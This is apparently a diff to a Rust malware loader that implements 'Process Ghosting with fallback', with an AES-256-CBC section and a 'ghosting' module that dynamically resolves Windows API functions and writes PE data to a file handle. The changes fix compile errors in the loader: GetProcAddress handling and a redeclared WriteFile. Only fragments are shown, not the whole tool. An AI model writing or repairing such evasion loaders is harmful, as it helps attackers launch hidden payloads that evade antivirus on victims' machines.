@@ -12,7 +12,6 @@
 // Technique: Process Ghosting with fallback
 
 use std::env;
-use std::ffi::CString;
 
 // ── AES-256-CBC ────────────────────────────────────────────────────────
 
@@ -439,7 +438,10 @@ mod ghosting {
         let h = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(mod_c.as_ptr());
         let h = if h == 0 { windows_sys::Win32::System::LibraryLoader::LoadLibraryA(mod_c.as_ptr()) } else { h };
         if h == 0 { return ptr::null_mut(); }
-        windows_sys::Win32::System::LibraryLoader::GetProcAddress(h, func_c.as_ptr()) as _
+        match windows_sys::Win32::System::LibraryLoader::GetProcAddress(h, func_c.as_ptr()) {
+            Some(f) => f as *mut std::ffi::c_void,
+            None => ptr::null_mut(),
+        }
     }
 
     fn to_wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }
@@ -458,7 +460,10 @@ mod ghosting {
         if file_handle == -1isize as isize { return false; }
 
         let mut written: u32 = 0;
-        let ok = windows_sys::Win32::Storage::FileSystem::WriteFile(
+        extern "system" {
+            fn WriteFile(hFile: isize, lpBuffer: *const u8, nNumberOfBytesToWrite: u32, lpNumberOfBytesWritten: *mut u32, lpOverlapped: *mut std::ffi::c_void) -> i32;
+        }
+        let ok = WriteFile(
             file_handle, pe_data.as_ptr(), pe_data.len() as u32, &mut written, ptr::null_mut(),
         );
         if ok == 0 || written != pe_data.len() as u32 {
